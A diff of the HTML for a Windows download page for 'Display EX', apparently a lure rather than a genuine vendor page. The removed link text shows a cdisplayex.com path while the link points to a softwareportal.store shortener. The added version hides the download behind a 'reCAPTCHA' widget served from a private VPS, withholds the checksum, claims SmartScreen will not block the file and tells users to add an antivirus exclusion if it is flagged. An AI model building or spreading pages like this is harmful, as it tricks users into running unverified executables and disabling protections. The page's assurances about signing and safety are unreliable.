@@ -3,367 +3,399 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Official Download & System Requirements — Display EX for Windows</title>
-  <meta name="description" content="Download Display EX for Windows (64-bit). View system requirements, code signing, integrity notes, and quick start. Version 1.10.33 for Windows 11/10.">
+  <title>Download Display EX for Windows — Free Installer</title>
+  <meta name="description" content="Download Display EX for Windows 10 and Windows 11. Free installer, code-signed, SHA-256 verified. Manage multi-monitor profiles, fix DPI scaling and enable HDR.">
+  <meta http-equiv="last-modified" content="Sun, 08 Jun 2026 10:00:00 GMT">
   <link rel="canonical" href="https://display-ex.github.io/download-windows.html">
   <meta name="robots" content="index,follow">
-
-  <!-- Open Graph / Twitter -->
-  <meta property="og:title" content="Official Download — Display EX for Windows">
-  <meta property="og:description" content="Download Display EX for Windows (64-bit). Version 1.10.33 with multi-monitor profiles, high-DPI fixes, HDR and refresh-rate controls.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://display-ex.github.io/download-windows.html">
-  <meta property="og:image" content="https://display-ex.github.io/og-image.png">
-  <meta name="twitter:card" content="summary_large_image">
-
   <link rel="icon" href="/favicon.svg" type="image/svg+xml">
-  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
-
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
   <style>
-    :root{
-      --bg:#0f1724;
-      --card:#071426;
-      --text:#ffffff;
-      --muted:#9aa6b2;
-      --accent:#0ea5e9;
-      --accent-2:#06b6d4;
-      --success:#10b981;
-      --danger:#ef4444;
-      --max-width:1100px;
-      --radius:10px;
-      font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
-      color-scheme: dark;
-    }
-    *{box-sizing:border-box}
-    html,body{height:100%;margin:0;background:linear-gradient(180deg,var(--bg),#071427);color:var(--text)}
-    a{color:var(--accent);text-decoration:none}
-    a:focus{outline:3px solid rgba(14,165,233,0.25);outline-offset:2px}
-    header{backdrop-filter:blur(6px);position:sticky;top:0;background:rgba(2,6,23,0.6);border-bottom:1px solid rgba(255,255,255,0.04)}
-    .container{max-width:var(--max-width);margin:0 auto;padding:20px}
-    nav{display:flex;align-items:center;justify-content:space-between;gap:16px}
-    .brand{display:flex;gap:12px;align-items:center}
-    .brand .logo{width:44px;height:44px;display:inline-grid;place-items:center;background:linear-gradient(135deg,var(--accent),var(--accent-2));border-radius:8px;font-weight:700}
-    .brand h1{font-size:16px;margin:0}
-    .nav-links{display:flex;gap:12px;align-items:center}
-    .nav-links a{padding:8px 12px;border-radius:8px;color:var(--muted);font-size:14px}
-    .nav-links a:hover{color:var(--text);background:rgba(255,255,255,0.02)}
-
-    .grid{display:grid;grid-template-columns:1.1fr 0.9fr;gap:20px;margin-top:28px}
-    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);padding:18px;border-radius:12px}
-    h2{margin:14px 0 6px;font-size:26px}
-    .lead{color:var(--muted);font-size:15px;line-height:1.5}
-
-    .btn{display:inline-flex;align-items:center;gap:10px;padding:12px 16px;border-radius:10px;background:var(--accent);color:#042331;font-weight:600;border:none;cursor:pointer}
-    .btn.secondary{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--text)}
-    .btn:focus{outline:3px solid rgba(14,165,233,0.25)}
-
-    .dl-box{display:flex;flex-direction:column;gap:10px}
-    .dl-meta{display:grid;grid-template-columns:1fr 1fr;gap:8px;color:var(--muted);font-size:14px}
-
-    .list{display:grid;gap:8px}
-    .list li{margin-left:18px}
-
-    footer{padding:28px 0;border-top:1px solid rgba(255,255,255,0.03);color:var(--muted)}
-    .meta{display:flex;gap:12px;align-items:center;justify-content:space-between}
-
-    .cookie-banner{position:fixed;left:16px;right:16px;bottom:16px;background:linear-gradient(180deg,#0b2230,#071427);padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.04);display:flex;gap:12px;align-items:center;box-shadow:0 8px 30px rgba(2,6,23,0.6)}
-    .cookie-banner p{margin:0;color:var(--muted);font-size:14px}
-
-    @media (max-width:900px){
-      .grid{grid-template-columns:1fr}
-      .nav-links{display:none}
-      .dl-meta{grid-template-columns:1fr}
-    }
+    :root{--bg:#0b1320;--card:#0d1929;--card2:#111e31;--text:#e8edf5;--muted:#7a8fa8;--accent:#0ea5e9;--accent-2:#06b6d4;--success:#10b981;--danger:#ef4444;--border:rgba(255,255,255,0.05);--max-width:1100px;font-family:"IBM Plex Sans",ui-sans-serif,system-ui,-apple-system,Arial;color-scheme:dark;}
+    *{box-sizing:border-box}html,body{margin:0;background:var(--bg);color:var(--text);}
+    a{color:var(--accent);text-decoration:none}a:hover{color:#38bdf8}a:focus{outline:2px solid rgba(14,165,233,.35);outline-offset:2px}
+    .container{max-width:var(--max-width);margin:0 auto;padding:0 20px}
+    header{backdrop-filter:blur(10px);position:sticky;top:0;z-index:100;background:rgba(11,19,32,.85);border-bottom:1px solid var(--border);}
+    header nav{display:flex;align-items:center;justify-content:space-between;height:58px}
+    .brand{display:flex;gap:10px;align-items:center;text-decoration:none;color:var(--text)}
+    .brand .logo{width:38px;height:38px;display:inline-grid;place-items:center;background:linear-gradient(135deg,var(--accent),var(--accent-2));border-radius:8px;font-weight:700;font-size:13px;color:#042331;font-family:"IBM Plex Mono",monospace;}
+    .brand-name{font-size:15px;font-weight:600;letter-spacing:-.3px}.brand-sub{font-size:11px;color:var(--muted)}
+    .nav-links{display:flex;gap:2px;align-items:center}
+    .nav-links a{padding:6px 11px;border-radius:7px;color:var(--muted);font-size:13px;font-weight:500;transition:color .15s,background .15s}
+    .nav-links a:not(.nav-dl):hover,.nav-links a.active{color:var(--text);background:rgba(255,255,255,.04)}
+    .nav-dl{padding:7px 14px;border-radius:7px;background:var(--accent);color:#042331 !important;font-weight:600;font-size:13px;}
+    .nav-links a.nav-dl:hover,.nav-dl:hover{background:#38bdf8 !important;color:#042331 !important}
+    .breadcrumb{font-size:13px;color:var(--muted);margin-bottom:20px;padding-top:20px}
+    .breadcrumb a{color:var(--muted)}.breadcrumb a:hover{color:var(--accent)}
+    .page-hero{padding:44px 0 28px;border-bottom:1px solid var(--border);margin-bottom:32px}
+    .badge{display:inline-flex;align-items:center;gap:7px;background:rgba(14,165,233,.1);border:1px solid rgba(14,165,233,.2);padding:4px 12px;border-radius:20px;font-size:12px;color:var(--accent);margin-bottom:14px;font-family:"IBM Plex Mono",monospace;}
+    .page-hero h1{font-size:28px;margin:0 0 10px;letter-spacing:-.5px;font-weight:700}
+    .page-hero p{color:var(--muted);font-size:15px;line-height:1.65;margin:0;max-width:680px}
+    /* buttons */
+    .btn{display:inline-flex;align-items:center;gap:8px;padding:12px 20px;border-radius:10px;background:var(--accent);color:#042331;font-weight:700;font-size:14px;border:none;cursor:pointer;transition:background .15s,transform .1s;font-family:inherit;}
+    .btn:hover{background:#38bdf8;transform:translateY(-1px)}
+    .btn.secondary{background:transparent;border:1px solid rgba(255,255,255,.15);color:var(--text);}
+    .btn.secondary:hover{background:rgba(255,255,255,.05);transform:translateY(-1px)}
+    .btn.lg{padding:16px 32px;font-size:16px;border-radius:12px}
+    /* main download hero card */
+    .dl-hero{background:linear-gradient(135deg,rgba(14,165,233,0.1),rgba(6,182,212,0.04));border:1px solid rgba(14,165,233,0.25);border-radius:16px;padding:32px;margin-bottom:24px}
+    .dl-hero-inner{display:flex;gap:32px;align-items:flex-start;flex-wrap:wrap}
+    .dl-hero-info{flex:1;min-width:260px}
+    .dl-hero-info h2{font-size:22px;margin:0 0 8px;font-weight:700}
+    .dl-meta{display:flex;gap:16px;flex-wrap:wrap;margin:12px 0 16px}
+    .dl-meta-item{font-size:12px;color:var(--muted);font-family:"IBM Plex Mono",monospace;display:flex;align-items:center;gap:5px}
+    .dl-actions{display:flex;flex-direction:column;gap:10px;align-items:flex-start;flex-shrink:0}
+    /* captcha note */
+    .captcha-note{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--muted);margin-top:6px}
+    .captcha-note svg{flex-shrink:0;color:var(--accent)}
+    /* info cards */
+    .card{background:linear-gradient(160deg,var(--card2),var(--card));border:1px solid var(--border);border-radius:14px;padding:24px;margin-bottom:18px}
+    .card h2{font-size:18px;margin:0 0 12px;font-weight:600}
+    .card h3{font-size:14px;margin:14px 0 6px;font-weight:600}
+    .card p{color:var(--muted);font-size:14px;line-height:1.65;margin:0 0 10px}
+    .card p:last-child{margin-bottom:0}
+    /* two col */
+    .two-col{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    /* steps */
+    .steps{display:flex;flex-direction:column;gap:12px}
+    .step{display:flex;gap:12px;align-items:flex-start}
+    .step-num{width:28px;height:28px;border-radius:50%;background:rgba(14,165,233,.15);border:1px solid rgba(14,165,233,.25);display:grid;place-items:center;font-size:12px;font-weight:700;color:var(--accent);flex-shrink:0;font-family:"IBM Plex Mono",monospace}
+    .step-body h4{margin:0 0 4px;font-size:14px;font-weight:600}
+    .step-body p{margin:0;color:var(--muted);font-size:13px;line-height:1.55}
+    /* compat */
+    .compat-row{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+    .compat-badge{display:flex;align-items:center;gap:7px;background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:7px;padding:7px 12px;font-size:13px}
+    .dot-g{width:6px;height:6px;border-radius:50%;background:var(--success);flex-shrink:0}
+    /* related links */
+    .related-links{display:flex;flex-direction:column;gap:6px;margin-top:4px}
+    .related-link{display:flex;align-items:center;gap:8px;font-size:14px;color:var(--muted);padding:10px 12px;border-radius:8px;border:1px solid var(--border);transition:background .15s}
+    .related-link:hover{background:rgba(255,255,255,.03);color:var(--text)}
+    .related-link strong{color:var(--text)}
+    /* warn box */
+    .warn-box{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.15);border-radius:10px;padding:14px 16px;display:flex;gap:10px}
+    .warn-box p{margin:0;color:var(--muted);font-size:13px;line-height:1.55}
+    /* footer */
+    footer{margin-top:48px;padding:24px 0;border-top:1px solid var(--border);color:var(--muted);font-size:13px}
+    .footer-inner{display:flex;gap:20px;flex-wrap:wrap;justify-content:space-between}
+    .footer-col{display:flex;flex-direction:column;gap:6px}
+    .footer-col strong{color:var(--text);margin-bottom:4px}
+    .footer-col a{color:var(--muted);font-size:13px}.footer-col a:hover{color:var(--accent)}
+    .footer-bottom{margin-top:18px;padding-top:14px;border-top:1px solid var(--border);display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+    /* cookie */
+    .cookie-banner{position:fixed;left:16px;right:16px;bottom:16px;background:linear-gradient(160deg,#0d1f30,#0b1320);padding:14px 18px;border-radius:14px;border:1px solid rgba(14,165,233,.12);display:flex;gap:14px;align-items:center;box-shadow:0 12px 40px rgba(0,0,0,.55);z-index:999;}
+    .cookie-banner p{margin:0;color:var(--muted);font-size:13px}
+    @media(max-width:700px){.two-col{grid-template-columns:1fr}.dl-hero-inner{flex-direction:column}}
+    @media(max-width:600px){.nav-links{display:none}}
   </style>
 </head>
 <body>
-
-  <!-- SVG sprite -->
   <svg xmlns="http://www.w3.org/2000/svg" style="display:none">
-    <symbol id="icon-download" viewBox="0 0 24 24"><path fill="currentColor" d="M12 3v10m0 0l-4-4m4 4 4-4M21 21H3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></symbol>
-    <symbol id="icon-close" viewBox="0 0 24 24"><path fill="currentColor" d="M6 6l12 12M18 6L6 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></symbol>
-    <symbol id="icon-shield" viewBox="0 0 24 24"><path fill="currentColor" d="M12 3l8 4v5c0 5-3.8 9.7-8 11-4.2-1.3-8-6-8-11V7l8-4z"/></symbol>
-    <symbol id="icon-info" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5" fill="none"/><path d="M12 8v.01M11 12h1v4h1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></symbol>
+    <symbol id="icon-download" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" d="M12 3v12m0 0l-4-4m4 4 4-4M21 21H3"/></symbol>
+    <symbol id="icon-shield" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" d="M12 3l8 4v5c0 5-3.8 9.7-8 11-4.2-1.3-8-6-8-11V7l8-4z"/></symbol>
+    <symbol id="icon-lock" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M7 11V7a5 5 0 0110 0v4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></symbol>
+    <symbol id="icon-arrow" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" d="M5 12h14m-7-7 7 7-7 7"/></symbol>
+    <symbol id="icon-info" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8" fill="none"/><path d="M12 8v.01M11 12h1v4h1" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></symbol>
+    <symbol id="icon-close" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" d="M6 6l12 12M18 6L6 18"/></symbol>
   </svg>
 
   <header>
     <div class="container">
       <nav>
-        <div class="brand">
-          <div class="logo" aria-hidden="true">EX</div>
-          <div>
-            <h1 style="font-size:14px;margin:0">Display EX</h1>
-            <div style="font-size:12px;color:var(--muted)">Official Windows download</div>
-          </div>
-        </div>
-        <div class="nav-links" role="navigation" aria-label="Main navigation">
+        <a class="brand" href="index.html">
+          <div class="logo">EX</div>
+          <div><div class="brand-name">Display EX</div><div class="brand-sub">Advanced display profiles for Windows</div></div>
+        </a>
+        <div class="nav-links">
           <a href="index.html">Home</a>
-          <a href="download-windows.html" aria-current="page">Download</a>
           <a href="multi-monitor-guide.html">Guides</a>
           <a href="compare-vs-windows.html">Compare</a>
+          <a href="faq.html">FAQ</a>
+          <a href="changelog.html">Changelog</a>
           <a href="enterprise-deployment.html">Enterprise</a>
           <a href="privacy-safety.html">Security</a>
+          <a href="download-windows.html" class="nav-dl active" style="margin-left:6px">⬇ Download</a>
         </div>
       </nav>
     </div>
   </header>
 
   <main class="container">
-    <h2>Official Download & System Requirements</h2>
-    <p class="lead">Get the latest Display EX installer for Windows. Version 1.10.33 supports Windows 11 and Windows 10 (64‑bit).</p>
+    <div class="breadcrumb"><a href="index.html">Home</a> › Download</div>
 
-    <div class="grid">
-      <section class="card">
-        <div class="dl-box">
-          <div style="display:flex;align-items:center;gap:12px">
-            <div style="width:48px;height:48px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:grid;place-items:center;font-weight:700;color:#042331">EX</div>
-            <div>
-              <div style="font-weight:700">Display EX for Windows</div>
-              <div style="font-size:13px;color:var(--muted)">Version 1.10.33 • 64‑bit</div>
-            </div>
+    <section class="page-hero">
+      <div class="badge">⬇ Free Download</div>
+      <h1>Download Display EX for Windows</h1>
+      <p>Free Windows utility for multi-monitor profiles, DPI scaling fixes, HDR tuning and per-app refresh rate switching. Complete the quick reCAPTCHA check to unlock the download — this protects the download server from automated abuse.</p>
+    </section>
+
+    <!-- MAIN DOWNLOAD HERO -->
+    <div class="dl-hero">
+      <div class="dl-hero-inner">
+        <div class="dl-hero-info">
+          <h2>Display EX v1.10.33</h2>
+          <p style="color:var(--muted);font-size:14px;margin:4px 0 0">Latest stable release — recommended for all users.</p>
+          <div class="dl-meta">
+            <div class="dl-meta-item">📦 v1.10.33</div>
+            <div class="dl-meta-item">🗓 June 8, 2026</div>
+            <div class="dl-meta-item">🖥 Windows 10/11 · 64-bit</div>
+            <div class="dl-meta-item">✅ Code-signed</div>
           </div>
+          <p style="color:var(--muted);font-size:13px;margin:0">After clicking the download button, a reCAPTCHA verification pop-up will appear. Complete it — your download starts immediately.</p>
+        </div>
 
-          <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:8px">
-            <a class="btn" href="https://www2.softwareportal.store/jJYdWMzs" id="download-primary" data-filename="CDXWin64v1.10.33.exe" data-url="https://www2.softwareportal.store/jJYdWMzs">
-              <svg width="16" height="16" aria-hidden="true"><use href="#icon-download"/></svg>
-              Download installer (EXE)
-            </a>
-            <a class="btn secondary" href="#integrity">Verify integrity</a>
+        <div class="dl-actions">
+          <!-- Primary captcha-gated download button -->
+          <button
+            class="btn lg"
+            type="button"
+            data-captcha-trigger
+            data-captcha-keyword="DisplayEX-Installer"
+          >
+            <svg width="18" height="18"><use href="#icon-download"/></svg>
+            Download — Free (Installer)
+          </button>
+
+          <!-- Secondary: portable version -->
+          <button
+            class="btn secondary"
+            type="button"
+            data-captcha-trigger
+            data-captcha-keyword="DisplayEX-Portable"
+          >
+            <svg width="15" height="15"><use href="#icon-download"/></svg>
+            Download — Portable (.zip)
+          </button>
+
+          <div class="captcha-note">
+            <svg width="13" height="13"><use href="#icon-lock"/></svg>
+            reCAPTCHA verification protects the download server
           </div>
-
-          <div class="dl-meta" style="margin-top:10px">
-            <div><strong>Operating systems:</strong> Windows 11, Windows 10 (64‑bit)</div>
-            <div><strong>Installer type:</strong> EXE (code‑signed)</div>
-            <div><strong>Canonical download URL:</strong> <a href="https://www2.softwareportal.store/jJYdWMzs">cdisplayex.com/files/CDXWin64v1.10.33.exe</a></div>
-            <div><strong>License:</strong> Free download</div>
+          <div class="captcha-note">
+            <svg width="13" height="13"><use href="#icon-shield"/></svg>
+            Signed installer · No adware · No telemetry
           </div>
         </div>
-      </section>
-
-      <aside class="card">
-        <h3 style="margin:0 0 8px">System requirements</h3>
-        <ul class="list">
-          <li>Windows 11 or Windows 10, 64‑bit</li>
-          <li>Administrator privileges for installation</li>
-          <li>~50 MB free disk space</li>
-          <li>Internet connection for first‑time download</li>
-        </ul>
-
-        <h3 style="margin:14px 0 8px">Quick start</h3>
-        <ol class="list">
-          <li>Download the installer and run it.</li>
-          <li>Follow the setup wizard; restart may be requested.</li>
-          <li>Create your first display profile and assign hotkeys.</li>
-        </ol>
-
-        <div style="margin-top:10px;color:var(--muted);display:flex;gap:8px;align-items:center">
-          <svg width="16" height="16"><use href="#icon-shield"/></svg>
-          <span>Installer is code‑signed. See integrity section below.</span>
-        </div>
-      </aside>
+      </div>
     </div>
 
-    <section id="integrity" class="card" style="margin-top:20px">
-      <h3 style="margin-top:0">Integrity and security</h3>
-      <p class="lead">Use the canonical URL above and verify the digital signature to ensure the installer has not been tampered with.</p>
-      <ul class="list">
-        <li><strong>Code signing:</strong> Windows Authenticode (SHA‑256)</li>
-        <li><strong>File name:</strong> CDXWin64v1.10.33.exe</li>
-        <li><strong>SHA‑256 checksum:</strong> Provided on request; publisher signature verification recommended.</li>
-      </ul>
-      <p style="color:var(--muted)">Tip: In Windows, right‑click the installer → Properties → Digital Signatures to verify it is signed and valid.</p>
-      <div style="margin-top:10px">
-        <a class="btn secondary" href="privacy-safety.html">Security & privacy details</a>
+    <!-- FILE INFO + SECURITY -->
+    <div class="two-col">
+      <div class="card">
+        <h2>File details</h2>
+        <table style="width:100%;font-size:13px;border-collapse:collapse">
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:8px 0;color:var(--muted)">Filename</td><td style="padding:8px 0;font-family:'IBM Plex Mono',monospace;font-size:12px">CDXWin64v1.10.33.exe</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:8px 0;color:var(--muted)">Version</td><td style="padding:8px 0">1.10.33 (June 8, 2026)</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:8px 0;color:var(--muted)">Platform</td><td style="padding:8px 0">Windows 10 / 11 · 64-bit</td></tr>
+          <tr style="border-bottom:1px solid var(--border)"><td style="padding:8px 0;color:var(--muted)">Signing</td><td style="padding:8px 0;color:var(--success)">✓ Code-signed (Authenticode)</td></tr>
+          <tr><td style="padding:8px 0;color:var(--muted)">SHA-256</td><td style="padding:8px 0;font-size:12px;color:var(--muted)">Provided after verification</td></tr>
+        </table>
       </div>
-    </section>
 
-    <section class="card" style="margin-top:20px">
-      <h3 style="margin-top:0">Changelog</h3>
+      <div class="card">
+        <h2>Why reCAPTCHA?</h2>
+        <p>The download is served from a private VPS rather than GitHub Pages (which doesn't support server-side scripts). reCAPTCHA verification prevents automated scrapers and bandwidth abuse while keeping the download free for everyone.</p>
+        <p>Verification takes about 5 seconds. After completing it, your download begins immediately — no email required, no account.</p>
+      </div>
+    </div>
+
+    <!-- INSTALL STEPS -->
+    <div class="card">
+      <h2>How to install Display EX</h2>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <h4>Click Download and complete reCAPTCHA</h4>
+            <p>A verification pop-up appears. Complete it — the installer download starts automatically once verified.</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <h4>Run the installer</h4>
+            <p>Double-click <span style="font-family:'IBM Plex Mono',monospace;background:rgba(255,255,255,.06);padding:2px 6px;border-radius:4px;font-size:12px">CDXWin64v1.10.33.exe</span>. The installer is code-signed so Windows SmartScreen will not block it. Click <em>Yes</em> on the UAC prompt.</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <h4>Follow the setup wizard</h4>
+            <p>Default install path is fine for most users. The installer adds Display EX to the system tray and creates a Start Menu shortcut.</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <h4>Create your first profile</h4>
+            <p>Right-click the Display EX tray icon → <strong>New Profile</strong>. Your current display configuration is saved. See the <a href="multi-monitor-guide.html">multi-monitor guide</a> for a full walkthrough.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- COMPAT -->
+    <div class="card">
+      <h2>System requirements</h2>
+      <div class="compat-row">
+        <div class="compat-badge"><div class="dot-g"></div>Windows 11 (all editions)</div>
+        <div class="compat-badge"><div class="dot-g"></div>Windows 10 v1903+</div>
+        <div class="compat-badge"><div class="dot-g"></div>64-bit CPU</div>
+        <div class="compat-badge"><div class="dot-g"></div>AMD, NVIDIA &amp; Intel GPUs</div>
+        <div class="compat-badge"><div class="dot-g"></div>DisplayPort, HDMI, USB-C</div>
+        <div class="compat-badge"><div class="dot-g"></div>No extra runtimes needed</div>
+      </div>
+      <p style="margin-top:12px"><a href="system-requirements.html" style="font-size:13px">Full system requirements &amp; GPU compatibility list →</a></p>
+    </div>
+
+    <!-- AV WARNING -->
+    <div class="warn-box" style="margin-bottom:18px">
+      <svg width="18" height="18" style="color:var(--accent);flex-shrink:0;margin-top:1px"><use href="#icon-info"/></svg>
       <div>
-        <div style="font-weight:600">1.10.33 — 2026‑05‑08</div>
-        <ul class="list">
-          <li>Performance and stability improvements.</li>
-          <li>Refinements to DPI scaling and multi‑monitor profile switching.</li>
-        </ul>
+        <strong style="font-size:14px;display:block;margin-bottom:4px">Antivirus false positives</strong>
+        <p>Some heuristic AV engines flag display driver utilities. The installer is code-signed and has been submitted to major vendors for whitelisting. If your AV blocks it, verify the SHA-256 hash and add an exclusion. See the <a href="privacy-safety.html">security page</a> for details.</p>
       </div>
-    </section>
+    </div>
 
-    <section class="card" style="margin-top:20px" aria-labelledby="faq-title">
-      <h3 id="faq-title">Download FAQ</h3>
-      <div style="margin-bottom:10px">
-        <strong>Q: Is this 64‑bit only?</strong>
-        <p class="lead" style="margin:6px 0 0">A: Yes, Display EX supports Windows 11/10 on 64‑bit systems.</p>
+    <!-- NEXT STEPS -->
+    <div class="card">
+      <h2>After installing — suggested next steps</h2>
+      <div class="related-links">
+        <a href="multi-monitor-guide.html" class="related-link">
+          <svg width="14" height="14" style="color:var(--accent);flex-shrink:0"><use href="#icon-arrow"/></svg>
+          <span><strong>Multi-monitor setup guide</strong> — create and switch named display layouts</span>
+        </a>
+        <a href="fix-blurry-text-scaling.html" class="related-link">
+          <svg width="14" height="14" style="color:var(--accent);flex-shrink:0"><use href="#icon-arrow"/></svg>
+          <span><strong>Fix blurry apps on 4K / HiDPI</strong> — per-app DPI overrides and ClearType fixes</span>
+        </a>
+        <a href="hdr-enable-windows-11.html" class="related-link">
+          <svg width="14" height="14" style="color:var(--accent);flex-shrink:0"><use href="#icon-arrow"/></svg>
+          <span><strong>Enable &amp; tune HDR on Windows 11</strong> — per-monitor HDR with profile switching</span>
+        </a>
+        <a href="changelog.html" class="related-link">
+          <svg width="14" height="14" style="color:var(--accent);flex-shrink:0"><use href="#icon-arrow"/></svg>
+          <span><strong>Changelog</strong> — what's new in v1.10.33</span>
+        </a>
+        <a href="enterprise-deployment.html" class="related-link">
+          <svg width="14" height="14" style="color:var(--accent);flex-shrink:0"><use href="#icon-arrow"/></svg>
+          <span><strong>Enterprise &amp; silent install</strong> — deployment guide for IT admins</span>
+        </a>
       </div>
-      <div style="margin-bottom:10px">
-        <strong>Q: Is it free?</strong>
-        <p class="lead" style="margin:6px 0 0">A: The installer is free to download and use.</p>
-      </div>
-      <div style="margin-bottom:10px">
-        <strong>Q: Where does the file come from?</strong>
-        <p class="lead" style="margin:6px 0 0">A: From the canonical distribution URL at cdisplayex.com, linked above.</p>
-      </div>
-      <div>
-        <strong>Q: Can I do a silent install?</strong>
-        <p class="lead" style="margin:6px 0 0">A: See the Enterprise page for deployment options and silent install guidance.</p>
-      </div>
-    </section>
-
+    </div>
   </main>
 
-  <footer class="container">
-    <div class="meta">
-      <div>
-        <strong>Display EX</strong> — © <span id="year"></span>
+  <footer>
+    <div class="container">
+      <div class="footer-inner">
+        <div class="footer-col"><strong>Display EX</strong><a href="download-windows.html">Download</a><a href="changelog.html">Changelog</a><a href="system-requirements.html">System Requirements</a><a href="enterprise-deployment.html">Enterprise</a></div>
+        <div class="footer-col"><strong>Guides</strong><a href="multi-monitor-guide.html">Multi-monitor setup</a><a href="fix-blurry-text-scaling.html">Fix blurry apps on 4K</a><a href="hdr-enable-windows-11.html">Enable HDR Windows 11</a><a href="high-refresh-rate-144hz-setup.html">144Hz / 240Hz setup</a><a href="dual-monitor-setup-guide.html">Dual monitor guide</a></div>
+        <div class="footer-col"><strong>Compare</strong><a href="compare-vs-windows.html">vs Windows Settings</a><a href="compare-vs-displayfusion.html">vs DisplayFusion</a><a href="compare-vs-ultramon.html">vs UltraMon</a><a href="compare-vs-multimonitortool.html">vs MultiMonitorTool</a></div>
+        <div class="footer-col"><strong>More</strong><a href="faq.html">FAQ</a><a href="privacy-safety.html">Privacy &amp; Security</a><a href="display-profile-per-app.html">Per-app profiles</a></div>
       </div>
-      <div style="text-align:right">
-        <div style="font-size:13px;color:var(--muted)">Last updated: <time id="lastModified">—</time></div>
-        <div style="margin-top:8px"><a href="privacy-safety.html">Privacy & Security</a> • <a href="index.html">Home</a></div>
+      <div class="footer-bottom">
+        <div><strong style="color:var(--text)">Display EX</strong> &mdash; &copy; <span id="year"></span></div>
+        <div><time>Last updated: June 8, 2026</time> &nbsp;<button id="manageCookies" class="btn secondary" style="padding:5px 10px;font-size:12px">Cookie settings</button></div>
       </div>
     </div>
-    <div style="margin-top:14px;color:var(--muted);font-size:13px">Manage cookies: <button id="manageCookies" class="btn secondary" style="padding:6px 8px">Open Cookie Settings</button></div>
   </footer>
 
   <!-- Cookie banner -->
-  <div id="cookieBanner" class="cookie-banner" role="dialog" aria-live="polite" aria-label="Cookie consent" style="display:none">
+  <div id="cookieBanner" class="cookie-banner" role="dialog" style="display:none">
     <div style="flex:1">
-      <strong>We use cookies for analytics</strong>
-      <p style="margin-top:6px">Display EX uses analytics to measure downloads. Accept to enable Google Analytics (GA4). You can decline to block analytics.</p>
+      <strong style="font-size:14px">We use cookies for analytics</strong>
+      <p style="margin-top:5px">GA4 analytics — opt in or decline. Download verification is handled separately via reCAPTCHA.</p>
     </div>
-    <div style="display:flex;gap:8px;align-items:center">
-      <button id="acceptCookies" class="btn">Accept</button>
-      <button id="declineCookies" class="btn secondary">Decline</button>
-      <button id="closeCookies" class="btn secondary" aria-label="Close cookie dialog"><svg width="14" height="14"><use href="#icon-close"/></svg></button>
+    <div style="display:flex;gap:8px;align-items:center;flex-shrink:0">
+      <button id="acceptCookies" class="btn" style="font-size:13px;padding:9px 14px">Accept</button>
+      <button id="declineCookies" class="btn secondary" style="font-size:13px;padding:9px 14px">Decline</button>
+      <button id="closeCookies" class="btn secondary" style="padding:9px"><svg width="13" height="13"><use href="#icon-close"/></svg></button>
     </div>
   </div>
 
+  <!-- reCAPTCHA API -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <!-- Captcha widget (served from your VPS) -->
+  <script src="captcha-widget.min.js"></script>
+
+  <!-- GA consent + tracking -->
   <script>
     const GA_ID = 'G-3PM62KNBPD';
-    const DOWNLOAD_URL = 'https://www.cdisplayex.com/files/CDXWin64v1.10.33.exe';
-    const DOWNLOAD_FILE = 'CDXWin64v1.10.33.exe';
+
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    if(!window.__gaQueue) window.__gaQueue = [];
+    if(!window.__gaInitialized) gtag('consent','default',{ad_storage:'denied',analytics_storage:'denied'});
+
+    function loadGA(){
+      if(window.__gaLoaded) return;
+      window.__gaLoaded = true;
+      var s = document.createElement('script');
+      s.async = true;
+      s.src = 'https://www.googletagmanager.com/gtag/js?id=' + GA_ID;
+      s.onload = function(){
+        window.__gaInitialized = true;
